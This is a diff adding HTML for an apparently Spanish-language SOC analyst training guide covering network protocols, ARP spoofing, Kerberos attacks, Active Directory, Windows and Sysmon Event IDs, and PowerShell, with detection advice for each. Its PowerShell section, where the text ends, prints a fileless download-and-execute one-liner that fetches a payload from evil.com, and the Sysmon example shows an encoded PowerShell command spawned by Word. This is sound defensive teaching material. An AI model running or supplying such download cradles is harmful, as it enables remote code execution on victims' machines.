+                <p><strong>Definición técnica:</strong> Método de asignación y notación de direcciones IP que reemplaza el sistema antiguo de clases A/B/C. Usa una barra diagonal seguida del número de bits de la máscara de red.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Uso en SOC</span><button class="copy-btn">Copiar</button></div>
+<pre># Bloquear todo el rango de una ASN maliciosa
+block src 45.33.0.0/16
+
+# Consulta SIEM para ver tráfico de un rango
+source_ip BETWEEN 10.20.30.0/24</pre>
+            </div>
+        </div>
+
+        <!-- ARP -->
+        <div class="card" id="concept-arp">
+            <div class="card-header-row">
+                <h3>ARP — Address Resolution Protocol</h3>
+                <span class="risk-badge risk-high">ALTO RIESGO</span>
+            </div>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Protocolo que resuelve direcciones IP (Capa 3) a direcciones MAC (Capa 2) dentro de una misma red local.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Funcionamiento ARP</span><button class="copy-btn">Copiar</button></div>
+<pre>PC-A quiere hablar con 192.168.1.10:
+1. ARP Request (broadcast): "¿Quién tiene 192.168.1.10? Cuéntaselo a 192.168.1.5"
+2. ARP Reply (unicast): "192.168.1.10 está en MAC AA:BB:CC:DD:EE:FF"
+3. PC-A guarda en tabla ARP: 192.168.1.10 → AA:BB:CC:DD:EE:FF</pre>
+            </div>
+            <div class="alert-critical">
+                <strong>🚨 Riesgo crítico — ARP Spoofing/Poisoning (MITM):</strong>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Escenario MITM via ARP Spoofing</span><button class="copy-btn">Copiar</button></div>
+<pre>Atacante envía ARP gratuitos falsos:
+- A Víctima: "La IP del Gateway (.1) es MI MAC"
+- Al Gateway: "La IP de Víctima es MI MAC"
+Resultado: Todo el tráfico pasa por el atacante
+
+Detección en SOC:
+- IP duplicada en tabla ARP
+- MAC address cambiando frecuentemente para misma IP
+- Herramienta: arpwatch, XArp</pre>
+            </div>
+        </div>
+
+        <!-- TCP/IP -->
+        <div class="card" id="concept-tcpip">
+            <h3>TCP/IP — Transmission Control Protocol / Internet Protocol</h3>
+            <div class="definition-block">
+                <p><strong>Definición técnica:</strong> Suite de protocolos que forman la base de internet. TCP proporciona comunicación confiable orientada a conexión; IP proporciona el direccionamiento y enrutamiento.</p>
+            </div>
+            <h4>Three-Way Handshake TCP</h4>
+            <div class="ascii-art">
+<pre>
+Cliente        Servidor
+   │                │
+   │──── SYN ──────▶│  "Quiero conectarme"
+   │                │
+   │◀─── SYN-ACK ───│  "De acuerdo, listo"
+   │                │
+   │──── ACK ──────▶│  "Confirmado, conectados"
+   │                │
+   [Conexión establecida]
+</pre>
+            </div>
+
+            <h4>Flags TCP</h4>
+            <table class="data-table">
+                <thead><tr><th>Flag</th><th>Nombre</th><th>Uso</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>SYN</strong></td><td>Synchronize</td><td>Inicio de conexión</td></tr>
+                    <tr><td><strong>ACK</strong></td><td>Acknowledge</td><td>Confirmación</td></tr>
+                    <tr><td><strong>FIN</strong></td><td>Finish</td><td>Cierre de conexión</td></tr>
+                    <tr><td><strong>RST</strong></td><td>Reset</td><td>Cierre abrupto</td></tr>
+                    <tr><td><strong>PSH</strong></td><td>Push</td><td>Enviar datos inmediatamente</td></tr>
+                    <tr><td><strong>URG</strong></td><td>Urgent</td><td>Datos urgentes</td></tr>
+                </tbody>
+            </table>
+
+            <div class="code-block">
+                <div class="code-header"><span>Patrones anómalos de TCP</span><button class="copy-btn">Copiar</button></div>
+<pre>SYN flood:   Muchos SYN sin respuesta ACK → DDoS
+Port scan:   SYN a múltiples puertos → Reconocimiento
+XMAS scan:   FIN+PSH+URG → Evasión de firewall
+NULL scan:   Sin flags → Evasión de firewall</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- Sub-sección 1.2 — Protocolos de Red -->
+    <section class="section" id="sec-1-2">
+        <h2 class="subsection-title">1.2 Protocolos de Red</h2>
+
+        <div class="card">
+            <h3>Tabla Resumen de Protocolos Críticos para SOC</h3>
+            <table class="data-table">
+                <thead><tr><th>Protocolo</th><th>Puerto(s)</th><th>TCP/UDP</th><th>Riesgo principal</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>FTP</strong></td><td>20/21</td><td>TCP</td><td>Credenciales en texto claro</td></tr>
+                    <tr><td><strong>SSH</strong></td><td>22</td><td>TCP</td><td>Brute force, tunneling</td></tr>
+                    <tr><td><strong>Telnet</strong></td><td>23</td><td>TCP</td><td>Sin cifrado</td></tr>
+                    <tr><td><strong>SMTP</strong></td><td>25/465/587</td><td>TCP</td><td>Phishing, spam, relay</td></tr>
+                    <tr><td><strong>DNS</strong></td><td>53</td><td>UDP/TCP</td><td>Tunneling, poisoning</td></tr>
+                    <tr><td><strong>HTTP</strong></td><td>80</td><td>TCP</td><td>Muchos ataques web</td></tr>
+                    <tr><td><strong>Kerberos</strong></td><td>88</td><td>TCP/UDP</td><td>Pass-the-Ticket, AS-REP roasting</td></tr>
+                    <tr><td><strong>NTP</strong></td><td>123</td><td>UDP</td><td>Amplification DDoS</td></tr>
+                    <tr><td><strong>SNMP</strong></td><td>161/162</td><td>UDP</td><td>Community strings</td></tr>
+                    <tr><td><strong>LDAP</strong></td><td>389/636</td><td>TCP</td><td>Credential harvesting</td></tr>
+                    <tr><td><strong>HTTPS</strong></td><td>443</td><td>TCP</td><td>Tunneling, cert abuse</td></tr>
+                    <tr><td><strong>SMB</strong></td><td>445</td><td>TCP</td><td>EternalBlue, ransomware</td></tr>
+                    <tr><td><strong>RDP</strong></td><td>3389</td><td>TCP</td><td>Brute force, BlueKeep</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- TCP & UDP -->
+        <div class="card" id="protocol-tcp">
+            <h3>TCP — Transmission Control Protocol</h3>
+            <div class="definition-block">
+                <p>Protocolo de transporte orientado a la conexión que garantiza la entrega ordenada y sin errores de los datos.</p>
+            </div>
+            <ul>
+                <li>Orientado a conexión (stateful)</li>
+                <li>Entrega garantizada y ordenada</li>
+                <li>Control de flujo y congestión</li>
+                <li>Más lento que UDP pero confiable</li>
+            </ul>
+            <div class="code-block">
+                <div class="code-header"><span>Ataques TCP</span><button class="copy-btn">Copiar</button></div>
+<pre>SYN Flood:      Enviar miles de SYN sin completar handshake → agota recursos
+TCP Hijacking:  Secuestrar sesión TCP mediante predicción de secuencia
+RST Attack:     Enviar RST falso para terminar conexiones legítimas</pre>
+            </div>
+        </div>
+
+        <div class="card" id="protocol-udp">
+            <h3>UDP — User Datagram Protocol</h3>
+            <div class="definition-block">
+                <p>Protocolo de transporte sin conexión que envía datagramas sin garantía de entrega, orden o integridad. Más rápido que TCP pero menos confiable.</p>
+            </div>
+            <p><strong>Usos típicos:</strong> DNS, DHCP, NTP, streaming de video, juegos online, VoIP.</p>
+            <div class="code-block">
+                <div class="code-header"><span>Ataques UDP</span><button class="copy-btn">Copiar</button></div>
+<pre>UDP Flood:         Enviar grandes volúmenes de paquetes UDP → saturar ancho de banda
+UDP Amplification: Usar servidores UDP (DNS, NTP) para amplificar ataques DDoS
+                   Ejemplo: NTP amplification hasta 556x el volumen original</pre>
+            </div>
+        </div>
+
+        <!-- HTTP & HTTPS -->
+        <div class="card" id="protocol-http">
+            <h3>HTTP — HyperText Transfer Protocol</h3>
+            <p><span class="tag">Puerto 80</span> <span class="tag">Sin cifrado</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Petición HTTP</span><button class="copy-btn">Copiar</button></div>
+<pre>GET /admin/login.php HTTP/1.1
+Host: www.empresa.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Cookie: session=abc123
+Accept: text/html,application/xhtml+xml</pre>
+            </div>
+            <h4>Códigos de Respuesta HTTP para SOC</h4>
+            <table class="data-table">
+                <thead><tr><th>Código</th><th>Significado</th><th>Relevancia SOC</th></tr></thead>
+                <tbody>
+                    <tr><td>200</td><td>OK</td><td>Normal</td></tr>
+                    <tr><td>301/302</td><td>Redirección</td><td>Phishing redirect</td></tr>
+                    <tr><td>400</td><td>Bad Request</td><td>Posible fuzzing</td></tr>
+                    <tr><td>401</td><td>Unauthorized</td><td>Intentos de autenticación</td></tr>
+                    <tr><td>403</td><td>Forbidden</td><td>Acceso no autorizado</td></tr>
+                    <tr><td>404</td><td>Not Found</td><td>Directory brute force</td></tr>
+                    <tr><td>500</td><td>Server Error</td><td>Posible explotación</td></tr>
+                    <tr><td>503</td><td>Service Unavailable</td><td>DDoS exitoso</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card" id="protocol-https">
+            <h3>HTTPS — HTTP Secure</h3>
+            <p><span class="tag">Puerto 443</span> <span class="tag tag-low">Cifrado TLS</span></p>
+            <div class="definition-block">
+                <p>Versión cifrada de HTTP que utiliza TLS para cifrar la comunicación entre cliente y servidor.</p>
+            </div>
+            <div class="alert-warning">
+                <strong>⚠️ ALERTA:</strong> Malware moderno usa HTTPS para cifrar comunicaciones C2. El cifrado NO es sinónimo de "seguro". Los analistas pueden analizar metadatos: IP destino, SNI, tamaño de paquetes, certificados autofirmados.
+            </div>
+        </div>
+
+        <!-- FTP -->
+        <div class="card" id="protocol-ftp">
+            <h3>FTP — File Transfer Protocol</h3>
+            <p><span class="tag">Puerto 21 (control)</span> <span class="tag">Puerto 20 (datos)</span> <span class="tag tag-high">Sin cifrado</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Riesgos FTP</span><button class="copy-btn">Copiar</button></div>
+<pre>1. Credenciales en texto claro → capturables con Wireshark
+2. FTP bounce attack → usar servidor FTP para escanear terceros
+3. Anonymous FTP → acceso sin credenciales si mal configurado</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Detección en SOC</span><button class="copy-btn">Copiar</button></div>
+<pre>Alerta: Transferencia FTP desde servidor interno hacia IP externa desconocida
+Volumen: 500MB en 10 minutos
+→ Posible exfiltración de datos</pre>
+            </div>
+        </div>
+
+        <!-- SSH -->
+        <div class="card" id="protocol-ssh">
+            <h3>SSH — Secure Shell</h3>
+            <p><span class="tag">Puerto 22</span> <span class="tag tag-low">Cifrado</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Ataques SSH</span><button class="copy-btn">Copiar</button></div>
+<pre>1. Brute force:    Intentar miles de combinaciones usuario/contraseña
+2. SSH tunneling:  Tunelizar tráfico malicioso a través de SSH
+3. SSH key abuse:  Robar claves privadas SSH para acceso persistente
+4. Port forwarding: Exponer servicios internos al exterior</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo de alerta brute force SSH</span><button class="copy-btn">Copiar</button></div>
+<pre>Fuente: 45.55.60.70
+Destino: 10.0.0.5 TCP/22
+Intentos: 1,547 en 5 minutos
+Usuarios probados: root, admin, test, ubuntu, oracle...
+Estado: BLOQUEADO por firewall tras 100 intentos</pre>
+            </div>
+        </div>
+
+        <!-- SMB -->
+        <div class="card" id="protocol-smb">
+            <div class="card-header-row">
+                <h3>SMB — Server Message Block</h3>
+                <span class="risk-badge risk-critical">⚠️ CRÍTICO</span>
+            </div>
+            <p><span class="tag">Puerto 445</span></p>
+            <div class="definition-block">
+                <p>Protocolo de red para compartir archivos, impresoras y recursos en redes Windows. Fundamental en entornos Active Directory.</p>
+            </div>
+            <h4>Vulnerabilidades Históricas</h4>
+            <table class="data-table">
+                <thead><tr><th>CVE</th><th>Nombre</th><th>Impacto</th></tr></thead>
+                <tbody>
+                    <tr><td>CVE-2017-0144</td><td>EternalBlue</td><td>WannaCry, NotPetya</td></tr>
+                    <tr><td>CVE-2020-0796</td><td>SMBGhost</td><td>RCE sin autenticación</td></tr>
+                    <tr><td>CVE-2017-0145</td><td>EternalChampion</td><td>Ejecución de código</td></tr>
+                </tbody>
+            </table>
+            <div class="code-block">
+                <div class="code-header"><span>Detección de abuso SMB</span><button class="copy-btn">Copiar</button></div>
+<pre>Movimiento lateral via PsExec:
+- Conexión SMB a \\SERVIDOR\IPC$ (autenticación)
+- Creación de servicio con name: PSEXESVC
+- Ejecución de proceso remoto
+Event IDs: 4624, 4648, 7045, 5145
+
+Pass-the-Hash:
+- Autenticación NTLM sin contraseña real (solo hash)
+- Event ID: 4624 con Logon Type 3</pre>
+            </div>
+        </div>
+
+        <!-- RDP -->
+        <div class="card" id="protocol-rdp">
+            <div class="card-header-row">
+                <h3>RDP — Remote Desktop Protocol</h3>
+                <span class="risk-badge risk-high">ALTO RIESGO</span>
+            </div>
+            <p><span class="tag">Puerto 3389</span> <span class="tag">TCP</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Riesgos RDP</span><button class="copy-btn">Copiar</button></div>
+<pre>1. BlueKeep (CVE-2019-0708): RCE sin autenticación en RDP
+2. Brute force:              Intentar credenciales por fuerza bruta
+3. RDP spraying:             Una contraseña, muchos usuarios
+4. Pass-the-Hash via RDP:    Con credenciales robadas
+5. Exposición a internet:    RDP expuesto = alto riesgo</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Event IDs de RDP</span><button class="copy-btn">Copiar</button></div>
+<pre>Event ID 4625: Fallo de inicio de sesión (brute force)
+Event ID 4624: Inicio de sesión exitoso (tipo 10 = RemoteInteractive)
+Event ID 4778: Sesión RDP reconectada
+Event ID 4779: Sesión RDP desconectada</pre>
+            </div>
+        </div>
+
+        <!-- Kerberos -->
+        <div class="card" id="protocol-kerberos">
+            <div class="card-header-row">
+                <h3>Kerberos</h3>
+                <span class="risk-badge risk-critical">CRÍTICO PARA SOC</span>
+            </div>
+            <p><span class="tag">Puerto 88</span> <span class="tag">TCP/UDP</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Componentes Kerberos</span><button class="copy-btn">Copiar</button></div>
+<pre>KDC (Key Distribution Center):
+├── AS (Authentication Service):  Emite TGT
+└── TGS (Ticket Granting Service): Emite Service Tickets
+
+TGT (Ticket Granting Ticket): Ticket de autenticación inicial (válido ~10h)
+Service Ticket (ST):          Ticket para acceder a un servicio específico</pre>
+            </div>
+            <div class="ascii-art">
+<pre>
+1. Usuario → KDC AS:  "Dame un TGT" (con hash de contraseña)
+2. KDC AS → Usuario:  TGT cifrado + Session Key
+3. Usuario → KDC TGS: "Dame ticket para Servicio X" (con TGT)
+4. KDC TGS → Usuario: Service Ticket
+5. Usuario → Servicio: "Accede" (con Service Ticket)
+</pre>
+            </div>
+
+            <h4>Ataques Kerberos críticos para SOC</h4>
+            <table class="data-table">
+                <thead><tr><th>Ataque</th><th>Descripción</th><th>Detección</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Kerberoasting</strong></td><td>Solicitar Service Ticket para cuentas de servicio y crackear offline</td><td>Muchas solicitudes TGS, Event 4769</td></tr>
+                    <tr><td><strong>AS-REP Roasting</strong></td><td>Obtener TGT para cuentas sin pre-auth y crackear</td><td>Event 4768 sin pre-auth</td></tr>
+                    <tr><td><strong>Pass-the-Ticket</strong></td><td>Reutilizar TGT robado para autenticarse</td><td>Misma IP, diferentes usuarios</td></tr>
+                    <tr><td><strong>Golden Ticket</strong></td><td>Crear TGT falso con hash KRBTGT</td><td>Ticket con anomalías</td></tr>
+                    <tr><td><strong>Silver Ticket</strong></td><td>Crear Service Ticket falso</td><td>Acceso sin eventos en KDC</td></tr>
+                    <tr><td><strong>Overpass-the-Hash</strong></td><td>Convertir hash NTLM en TGT Kerberos</td><td>Anomalías de autenticación</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- LDAP & SNMP & ICMP -->
+        <div class="card" id="protocol-ldap">
+            <h3>LDAP — Lightweight Directory Access Protocol</h3>
+            <p><span class="tag">Puerto 389</span> <span class="tag">Puerto 636 (LDAPS)</span></p>
+            <div class="code-block">
+                <div class="code-header"><span>Ataques LDAP</span><button class="copy-btn">Copiar</button></div>
+<pre>LDAP Injection: Similar a SQL injection pero contra directorio
+LDAP Enumeration: Consultar AD sin autenticación (null sessions) 
+Credential Harvesting: Usar LDAP para listar usuarios y cuentas</pre>
+            </div>
+        </div>
+
+        <div class="card" id="protocol-snmp">
+            <h3>SNMP — Simple Network Management Protocol</h3>
+            <p><span class="tag">Puerto 161/162</span> <span class="tag">UDP</span></p>
+            <table class="data-table">
+                <thead><tr><th>Versión</th><th>Autenticación</th><th>Riesgo</th></tr></thead>
+                <tbody>
+                    <tr><td>SNMPv1</td><td>Community string en claro</td><td><span class="risk-badge risk-critical">MUY ALTO</span></td></tr>
+                    <tr><td>SNMPv2c</td><td>Community string en claro</td><td><span class="risk-badge risk-high">ALTO</span></td></tr>
+                    <tr><td>SNMPv3</td><td>Autenticación + cifrado</td><td><span class="risk-badge risk-low">BAJO</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card" id="protocol-icmp">
+            <h3>ICMP — Internet Control Message Protocol</h3>
+            <p><span class="tag">Sin puerto (protocolo IP tipo 1)</span></p>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Código</th><th>Significado</th></tr></thead>
+                <tbody>
+                    <tr><td>0</td><td>0</td><td>Echo Reply (ping respuesta)</td></tr>
+                    <tr><td>3</td><td>0-15</td><td>Destination Unreachable</td></tr>
+                    <tr><td>8</td><td>0</td><td>Echo Request (ping)</td></tr>
+                    <tr><td>11</td><td>0</td><td>Time Exceeded (TTL)</td></tr>
+                </tbody>
+            </table>
+            <div class="code-block">
+                <div class="code-header"><span>Ataques ICMP</span><button class="copy-btn">Copiar</button></div>
+<pre>Ping Flood:      Saturar con Echo Requests → DDoS
+ICMP Tunneling:  Exfiltrar datos dentro de paquetes ICMP (iodine, ptunnel)
+Smurf Attack:    Broadcast ICMP con IP origen suplantada → amplificación</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- Sub-sección 1.3 — Modelos de Red -->
+    <section class="section" id="sec-1-3">
+        <h2 class="subsection-title">1.3 Modelos de Red</h2>
+
+        <div class="card" id="modelo-osi">
+            <h3>Modelo OSI — Open Systems Interconnection</h3>
+            <div class="definition-block">
+                <p>Modelo conceptual de 7 capas que estandariza las funciones de comunicación de un sistema de telecomunicaciones.</p>
+            </div>
+            <div class="ascii-art">
+<pre>
+┌─────────────────────────────────────────────┐
+│  7 - APLICACIÓN    │ HTTP, FTP, DNS, SMTP   │
+├─────────────────────────────────────────────┤
+│  6 - PRESENTACIÓN  │ SSL/TLS, Compresión    │
+├─────────────────────────────────────────────┤
+│  5 - SESIÓN        │ NetBIOS, RPC, SQL      │
+├─────────────────────────────────────────────┤
+│  4 - TRANSPORTE    │ TCP, UDP               │
+├─────────────────────────────────────────────┤
+│  3 - RED           │ IP, ICMP, OSPF, BGP    │
+├─────────────────────────────────────────────┤
+│  2 - ENLACE DATOS  │ Ethernet, WiFi, ARP    │
+├─────────────────────────────────────────────┤
+│  1 - FÍSICA        │ Cables, señales        │
+└─────────────────────────────────────────────┘
+</pre>
+            </div>
+
+            <h4>Ataques por Capa OSI</h4>
+            <table class="data-table">
+                <thead><tr><th>Capa</th><th>Nombre</th><th>Ataques Comunes</th></tr></thead>
+                <tbody>
+                    <tr><td>7</td><td>Aplicación</td><td>SQLi, XSS, CSRF, DDoS HTTP, DNS hijacking</td></tr>
+                    <tr><td>6</td><td>Presentación</td><td>SSL stripping, cert abuse</td></tr>
+                    <tr><td>5</td><td>Sesión</td><td>Session hijacking, replay attacks</td></tr>
+                    <tr><td>4</td><td>Transporte</td><td>SYN flood, port scanning, UDP flood</td></tr>
+                    <tr><td>3</td><td>Red</td><td>IP spoofing, ICMP attacks, routing attacks</td></tr>
+                    <tr><td>2</td><td>Enlace</td><td>ARP spoofing, MAC flooding, VLAN hopping</td></tr>
+                    <tr><td>1</td><td>Física</td><td>Wiretapping, jamming</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card" id="modelo-tcpip">
+            <h3>Modelo TCP/IP</h3>
+            <div class="ascii-art">
+<pre>
+OSI Model          TCP/IP Model
+───────────        ────────────
+7 Aplicación   ┐
+6 Presentación ├── Aplicación     (HTTP, FTP, DNS, SMTP)
+5 Sesión       ┘
+4 Transporte   ─── Transporte     (TCP, UDP)
+3 Red          ─── Internet       (IP, ICMP)
+2 Enlace datos ┐
+1 Física       ┘── Acceso a Red   (Ethernet, WiFi)
+</pre>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 2 — SISTEMAS OPERATIVOS -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-2">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 2</div>
+            <h1 class="section-title">💻 Fundamentos de Sistemas Operativos</h1>
+            <p class="section-intro">Conocimientos esenciales de Windows y Linux para analistas SOC. Active Directory, Event Logs, permisos y más.</p>
+        </div>
+    </section>
+
+    <!-- 2.1 Windows -->
+    <section class="section" id="sec-2-1">
+        <h2 class="subsection-title">2.1 Windows</h2>
+
+        <!-- Active Directory -->
+        <div class="card" id="concept-ad">
+            <div class="card-header-row">
+                <h3>Active Directory (AD)</h3>
+                <span class="risk-badge risk-critical">OBJETIVO #1 DE ATACANTES</span>
+            </div>
+            <div class="definition-block">
+                <p>Servicio de directorio de Microsoft que centraliza la autenticación, autorización y administración de recursos en entornos Windows corporativos.</p>
+            </div>
+            <h4>Componentes Principales</h4>
+            <table class="data-table">
+                <thead><tr><th>Componente</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Domain Controller (DC)</strong></td><td>Servidor que aloja AD, autentica usuarios</td></tr>
+                    <tr><td><strong>Domain</strong></td><td>Agrupación lógica de objetos (empresa.local)</td></tr>
+                    <tr><td><strong>Forest</strong></td><td>Conjunto de dominios con relación de confianza</td></tr>
+                    <tr><td><strong>OU (Org. Unit)</strong></td><td>Contenedor para organizar objetos</td></tr>
+                    <tr><td><strong>GPO</strong></td><td>Políticas aplicadas a usuarios/equipos</td></tr>
+                    <tr><td><strong>KRBTGT</strong></td><td>Cuenta especial para Kerberos, el "corazón" del DC</td></tr>
+                </tbody>
+            </table>
+
+            <h4>Eventos AD Críticos para Monitorear</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Event IDs Críticos de AD</span><button class="copy-btn">Copiar</button></div>
+<pre>4720 - Cuenta de usuario creada
+4722 - Cuenta de usuario habilitada
+4725 - Cuenta de usuario deshabilitada
+4728 - Usuario añadido a grupo global
+4732 - Usuario añadido a grupo local
+4756 - Usuario añadido a grupo universal
+4740 - Cuenta bloqueada por exceso de intentos
+4648 - Inicio de sesión con credenciales explícitas
+4768 - Solicitud de ticket Kerberos (TGT)
+4769 - Solicitud de service ticket Kerberos
+4771 - Fallo de pre-autenticación Kerberos</pre>
+            </div>
+
+            <h4>Señales de Compromiso AD</h4>
+            <div class="code-block">
+                <div class="code-header"><span>IoCs en Active Directory</span><button class="copy-btn">Copiar</button></div>
+<pre>- Nuevas cuentas con privilegios en horario no laboral
+- Adición a grupo Domain Admins de cuenta no conocida
+- Acceso al DC desde workstation de usuario regular
+- Cambio de contraseña de KRBTGT (indicador de Golden Ticket)
+- BloodHound data collection (LDAP queries masivas)</pre>
+            </div>
+        </div>
+
+        <!-- GPO -->
+        <div class="card" id="concept-gpo">
+            <h3>GPO — Group Policy Object</h3>
+            <div class="definition-block">
+                <p>Conjunto de configuraciones y políticas aplicadas de forma centralizada a usuarios y computadoras en un dominio de Active Directory.</p>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplos de GPO de Seguridad</span><button class="copy-btn">Copiar</button></div>
+<pre>- Política de contraseñas: longitud mínima, complejidad, historial
+- Bloquear USB y dispositivos removibles
+- Configurar Windows Defender
+- Deshabilitar acceso a Panel de Control
+- Configurar screensaver con contraseña
+- Restringir ejecución de aplicaciones (AppLocker/SRP)</pre>
+            </div>
+            <div class="alert-critical">
+                <strong>🚨 Abuso de GPO por atacantes:</strong> Si un atacante obtiene permisos de escritura sobre una GPO puede distribuir malware a todos los equipos del dominio, crear cuentas administrativas locales, o deshabilitar controles de seguridad. Herramienta: BloodHound detecta rutas de ataque GPO.
+            </div>
+        </div>
+
+        <!-- Event Viewer -->
+        <div class="card" id="concept-eventviewer">
+            <div class="card-header-row">
+                <h3>Event Viewer / Visor de Eventos</h3>
+                <span class="risk-badge risk-critical">FUENTE PRINCIPAL DE LOGS</span>
+            </div>
+            <h4>Registros Principales</h4>
+            <table class="data-table">
+                <thead><tr><th>Log</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Security</strong></td><td>Auditoría de seguridad</td></tr>
+                    <tr><td><strong>System</strong></td><td>Eventos del SO</td></tr>
+                    <tr><td><strong>Application</strong></td><td>Eventos de aplicaciones</td></tr>
+                    <tr><td><strong>PowerShell</strong></td><td>Actividad PowerShell</td></tr>
+                    <tr><td><strong>Sysmon</strong></td><td>Eventos avanzados (Sysmon)</td></tr>
+                </tbody>
+            </table>
+
+            <h4>Event IDs Críticos para SOC L1</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Event IDs — Autenticación</span><button class="copy-btn">Copiar</button></div>
+<pre>4624 - Inicio de sesión exitoso
+4625 - Fallo de inicio de sesión
+4634 - Cierre de sesión
+4648 - Logon con credenciales explícitas
+4672 - Privilegios especiales asignados</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Event IDs — Usuarios y Procesos</span><button class="copy-btn">Copiar</button></div>
+<pre>4720 - Cuenta creada        | 4688 - Nuevo proceso creado
+4728 - Usuario añadido      | 7034 - Servicio terminó inesperadamente
+4732 - Añadido a admin local| 7045 - Nuevo servicio instalado
+4740 - Cuenta bloqueada     | 4663 - Acceso a objeto</pre>
+            </div>
+            <div class="code-block">
+                <div class="code-header"><span>Event IDs — PowerShell y Red</span><button class="copy-btn">Copiar</button></div>
+<pre>4103 - Actividad de módulo PS | 5140 - Compartición de red accedida
+4104 - Script PS ejecutado    | 5145 - Objeto de red verificado
+4719 - Política de auditoría cambiada</pre>
+            </div>
+
+            <h4>Tipos de Logon (Event 4624)</h4>
+            <table class="data-table">
+                <thead><tr><th>Tipo</th><th>Descripción</th><th>Relevancia</th></tr></thead>
+                <tbody>
+                    <tr><td>2</td><td>Interactive (local)</td><td>Normal</td></tr>
+                    <tr><td>3</td><td>Network</td><td>Acceso a recursos compartidos</td></tr>
+                    <tr><td>4</td><td>Batch</td><td>Tareas programadas</td></tr>
+                    <tr><td>5</td><td>Service</td><td>Servicios del sistema</td></tr>
+                    <tr><td>7</td><td>Unlock</td><td>Desbloqueo de pantalla</td></tr>
+                    <tr><td>8</td><td>NetworkCleartext</td><td>Credenciales en claro por red</td></tr>
+                    <tr><td>9</td><td>NewCredentials</td><td>RunAs</td></tr>
+                    <tr><td>10</td><td>RemoteInteractive</td><td>RDP</td></tr>
+                    <tr><td>11</td><td>CachedInteractive</td><td>Credenciales cacheadas</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Sysmon -->
+        <div class="card" id="concept-sysmon">
+            <h3>Sysmon — System Monitor</h3>
+            <div class="definition-block">
+                <p>Herramienta gratuita de Microsoft Sysinternals que monitorea y registra actividad del sistema con mucho más detalle que el Event Log nativo.</p>
+            </div>
+            <h4>Event IDs Sysmon Clave</h4>
+            <table class="data-table">
+                <thead><tr><th>ID</th><th>Evento</th><th>Valor para SOC</th></tr></thead>
+                <tbody>
+                    <tr><td>1</td><td>Process Create</td><td>Qué proceso corrió, desde dónde, con qué argumentos</td></tr>
+                    <tr><td>2</td><td>File creation time changed</td><td>Timestomping (antiforense)</td></tr>
+                    <tr><td>3</td><td>Network Connection</td><td>Qué proceso hizo qué conexión</td></tr>
+                    <tr><td>6</td><td>Driver Loaded</td><td>Rootkits</td></tr>
+                    <tr><td>7</td><td>Image Loaded</td><td>DLL injection</td></tr>
+                    <tr><td>8</td><td>CreateRemoteThread</td><td>Inyección de código</td></tr>
+                    <tr><td>10</td><td>ProcessAccess</td><td>LSASS dump</td></tr>
+                    <tr><td>11</td><td>FileCreate</td><td>Archivos creados</td></tr>
+                    <tr><td>12-13</td><td>Registry Key/Value</td><td>Persistencia vía registro</td></tr>
+                    <tr><td>22</td><td>DNS Query</td><td>Consultas DNS por proceso</td></tr>
+                    <tr><td>25</td><td>ProcessTampering</td><td>Evasión de detección</td></tr>
+                </tbody>
+            </table>
+
+            <div class="code-block">
+                <div class="code-header"><span>Ejemplo Sysmon 1 — Macro Maliciosa</span><button class="copy-btn">Copiar</button></div>
+<pre>&lt;EventID&gt;1&lt;/EventID&gt;
+&lt;Image&gt;C:\Windows\System32\cmd.exe&lt;/Image&gt;
+&lt;CommandLine&gt;cmd.exe /c powershell.exe -enc JABjAGwA...&lt;/CommandLine&gt;
+&lt;ParentImage&gt;C:\Program Files\Microsoft Office\Office16\WINWORD.EXE&lt;/ParentImage&gt;
+&lt;User&gt;EMPRESA\jsmith&lt;/User&gt;
+
+→ ALERTA: Word ejecutando CMD → PowerShell con Base64
+→ Indicador claro de macro maliciosa en documento Office</pre>
+            </div>
+        </div>
+
+        <!-- PowerShell -->
+        <div class="card" id="concept-powershell">
+            <div class="card-header-row">
+                <h3>PowerShell</h3>
+                <span class="risk-badge risk-high">HERRAMIENTA FAVORITA DE ATACANTES</span>
+            </div>
+            <div class="key-concept">
+                <strong>Importancia en SOC:</strong> PowerShell es la herramienta preferida de los atacantes ("living off the land") porque viene instalado en todos los Windows, puede acceder a APIs del sistema, y puede descargar y ejecutar código en memoria sin tocar disco.
+            </div>
+
+            <h4>Técnicas Maliciosas de PowerShell</h4>
+            <div class="code-block">
+                <div class="code-header"><span>Técnicas de ataque PowerShell</span><button class="copy-btn">Copiar</button></div>
+<pre># Descarga y ejecución en memoria (fileless)
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+
+# Comando codificado en Base64 para evadir detección
